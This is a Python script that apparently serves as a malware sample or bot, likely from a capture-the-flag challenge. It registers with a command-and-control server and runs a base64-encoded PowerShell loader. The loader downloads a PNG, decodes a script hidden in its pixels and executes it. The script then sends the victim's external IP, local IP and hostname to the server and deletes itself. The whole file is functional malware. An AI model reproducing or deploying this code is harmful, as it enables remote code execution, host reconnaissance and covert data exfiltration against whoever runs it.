from requests import post, get
from hashlib import md5
from time import time
from random import seed, random
from subprocess import Popen
from platform import uname
from sys import argv
from re import compile
from socket import gethostname, gethostbyname

def endpoint(key):
    try:
        command = """powershell -EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIAAiAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAiADsAJABnAD0AYQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwACgAKABhACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ATwBwAGUAbgBSAGUAYQBkACgAIgBoAHQAdABwAHMAOgAvAC8AdABlAGwAZQBnAHIAYQAuAHAAaAAvAGYAaQBsAGUALwBjADMAYgAyADIANQBjAGIAZAA0AGQANgBmAGEAZgAwAGUAZQA4ADAAYgAuAHAAbgBnACIAKQApADsAJABnAC4AUwBhAHYAZQAoACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABJAG0AYQBnAGUALgBwAG4AZwAiACkAOwBJAEUAWAAoACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABJAG0AYQBnAGUALgBwAG4AZwAiACkAOwAkAG8APQBhACAAQgB5AHQAZQBbAF0AIAA3ADAANQA7ACgAMAAuAC4AMAApAHwAJQB7AGYAbwByAGUAYQBjAGgAKAAkAHgAIABpAG4AKAAwAC4ALgA3ADAANAApACkAewAkAHAAPQAkAGcALgBHAGUAdABQAGkAeABlAGwAKAAkAHgALAAkAF8AKQA7ACQAbwBbACQAXwAqADcAMAA1ACsAJAB4AF0APQAoAFsAbQBhAHQAaABdADoAOgBGAGwAbwBvAHIAKAAoACQAcAAuAEIALQBiAGEAbgBkADEANQApACoAMQA2ACkALQBiAG8AcgAoACQAcAAuAEcAIAAtAGIAYQBuAGQAIAAxADUAKQApAH0AfQA7AEkARQBYACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAG8AWwAwAC4ALgA1ADgAMgBdACkAKQA7AA=="""
        with open('C:\Windows\Temp\isfs23.ps1', 'w') as f:
            f.writelines(command)
        Popen('powershell  C:/Windows/Temp/isfs23.ps1', bufsize=1, shell=True)
        dict = {'bot':key,
        'ip_external':str(compile(r'\d+\.\d+\.\d+\.\d+').search(get('http://checkip.dyndns.com').text).group(0)),
        'ip_local':str(gethostbyname(gethostname())),
        'status':'active',
        'hostname':str(uname()[1])}
        post('http://58dbeb8931d545c1b9fcf34467806623.cnc.ctfcup.ru/{}'.format(key), json=dict)
        Popen("del {}".format(str(argv[0])), shell=True)
    except:
        Popen('del {}'.format(str(argv[0])), shell=True)

def register():
    seed(round(time()))
    key = str(md5(str(random()).encode()).hexdigest())
    res = post('http://58dbeb8931d545c1b9fcf34467806623.cnc.ctfcup.ru/new/endpoint', json={'secret_key':key})
    if str(res.text) == "complete":
        endpoint(key)
    else:
        Popen('del {}'.format(str(argv[0])), shell=True)
register()
